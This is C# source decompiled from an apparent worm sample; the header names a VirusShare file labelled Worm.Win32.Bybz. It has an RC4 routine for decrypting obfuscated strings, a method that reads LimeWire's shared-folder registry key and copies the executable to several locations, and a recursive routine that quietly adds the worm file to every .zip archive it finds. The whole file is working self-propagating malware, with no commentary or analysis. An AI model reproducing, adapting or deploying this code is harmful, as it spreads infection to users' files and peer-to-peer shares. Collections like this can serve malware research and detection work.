﻿// Decompiled with JetBrains decompiler
// Type: ajhfsdlhjasnagfgewfwsg.RRRRR
// Assembly: Rokan, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 170F4640-026D-46A0-96EF-63F7CE568476
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Worm.Win32.Bybz.dma-ede80954aa264e7f1fb365b2d83e8d211c6a79e95bdca110aeaef84c696635db.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ajhfsdlhjasnagfgewfwsg
{
  public class RRRRR
  {
    [DebuggerNonUserCode]
    public RRRRR()
    {
    }

    public static string RC4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public static void msdnfmsnfmdsnfmdsnfmsdnfmdsnfmsdnf()
    {
      Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\LimeWire\\\\", true).GetValue("Shared", (object) 0).ToString();
      try
      {
        string str1 = RRRRR.RC4("è÷?s\u0004dÆá&\u000E@îÇ\u0016\u0019ûê–óJ\u00B3\u00B2ˆú\u0004‚", "wertf32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32") + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str1));
        string str2 = RRRRR.RC4("fˆç>f]¥¥¤L±2ÇLg\\\u0012&ùò¦\u0010ìqX¢\vr\u001A$", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32") + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str2));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        string str3 = RRRRR.RC4("]¯ç<hy\u00B3\u00BC£Q¢ êY;J\u0014\v", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32") + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str3));
        string str4 = RRRRR.RC4("VŸç(uL®\u00BD’D£-ôutZ\u0014\u0016íÿ±\f·lO£", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32") + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str4));
        string str5 = RRRRR.RC4("fˆç>f]¥¥¤L±2ÇLg\\\u0012&ùò¦\u0010ìqX¢\vr\u001A$", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32") + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str5));
        string str6 = RRRRR.RC4("D‚ô<P_µª\u00BE}¦ ê^$\u0017\u0004\u001Aê", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32").Replace(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32"), RRRRR.RC4("°ßRËŠ\u0016\u0016\u00AD\u00B2ëíF{y\u008F\u00BEØ/#", "sikan323")) + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str6));
        string str7 = RRRRR.RC4("\u0081Ã\\À§\a\u0014ÿš¬ò@z", "sikan323");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32").Replace(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32"), RRRRR.RC4("°ßRËŠ\u0016\u0016\u00AD\u00B2ëíF{y\u008F\u00BEØ/#", "sikan323")) + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str7));
        string str8 = RRRRR.RC4("G™é<fG»‘»K\u00B2$÷\u0004fZ\u0005", "sikan32");
        File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32").Replace(RRRRR.RC4("DŸé5}H±¨¤N\u00B32", "sikan32"), RRRRR.RC4("°ßRËŠ\u0016\u0016\u00AD\u00B2ëíF{y\u008F\u00BEØ/#", "sikan323")) + RRRRR.RC4("h\u00BEî3}L¸’", "sikan32") + str8));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void asdiuaysdiuyasdiuysaidusyaiduysaiduywique(string MainDir, string YourFile)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
      ListBox listBox = new ListBox();
      try
      {
        string[] directories = Directory.GetDirectories(MainDir);
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string str1 = directories[index1];
          string[] files = Directory.GetFiles(str1, "*.zip");
          int index2 = 0;
          while (index2 < files.Length)
          {
            string str2 = files[index2];
            listBox.Items.Add((object) str2);
            checked { ++index2; }
          }
          RRRRR.asdiuaysdiuyasdiuysaidusyaiduysaiduywique(str1, YourFile);
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        foreach (object obj in listBox.Items)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(obj);
          Process.Start(new ProcessStartInfo()
          {
            FileName = folderPath + RRRRR.RC4("_¸\u009DÌâ=¿ÙaauÉ€÷", "Sikan32"),
            Arguments = " a " + objectValue.ToString() + " " + YourFile,
            WindowStyle = ProcessWindowStyle.Hidden
          });
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }
}